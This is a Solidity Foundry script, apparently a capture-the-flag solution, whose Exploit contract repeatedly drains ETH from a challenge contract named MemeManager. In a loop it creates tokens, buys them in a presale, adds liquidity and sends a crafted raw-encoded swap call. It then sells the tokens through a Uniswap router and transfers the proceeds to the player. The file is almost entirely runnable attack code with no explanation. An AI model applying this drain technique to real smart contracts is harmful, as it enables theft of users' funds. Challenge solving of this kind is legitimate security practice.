// pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {MemeToken} from "src/MemeToken.sol";
import {MemeManager} from "src/MemeManager.sol";
import {IUniswapV2Router02} from "src/interfaces/IUniswapV2Router02.sol";
contract Solve is Script {
    function run() public {
        vm.startBroadcast();
        Exploit exploit = new Exploit();
        exploit.exploit{value: 0.95 ether}(msg.sender, vm.envAddress("MEME_MANAGER"));
        console.log("eth balance", msg.sender.balance);
        vm.stopBroadcast();
    }
}

contract Exploit {

    receive() external payable {}
    fallback() external payable {}
    function exploit(address player, address memeManager) public payable {
        MemeManager memeManager = MemeManager(payable(memeManager));
        address factory = memeManager.FACTORY();
        address router = memeManager.ROUTER();
        address weth = memeManager.WETH();

        for(uint i=0;i<10;i++) {
            (address token, address pair) = memeManager.createMeme("hi", "helo", 0.0001 * 1e18);
            uint256 amount;
            if(i==0) {
                amount = 0.95 * 1e18;
            }
            else {
                amount = address(this).balance;
            }
            memeManager.preSale{value: amount}(token, 10000 * amount);
            memeManager.ProvideLiquidity(token, block.timestamp);
            bytes memory payload;
            payload = abi.encodePacked(
                memeManager.swap.selector,
                uint8(1),
                token,
                uint256(amount),
                uint8(1)
            );
            (bool success, ) = address(memeManager).call(payload);
            IERC20(token).approve(router, IERC20(token).balanceOf(address(this)));
            address[] memory path = new address[](2);
            path[0] = token;
            path[1] = weth;
            IUniswapV2Router02(router).swapExactTokensForETH(IERC20(token).balanceOf(address(this)), 0, path, address(this), block.timestamp);
        }
        console.log("eth balance", address(this).balance);
        payable(player).transfer(address(this).balance);

    }
}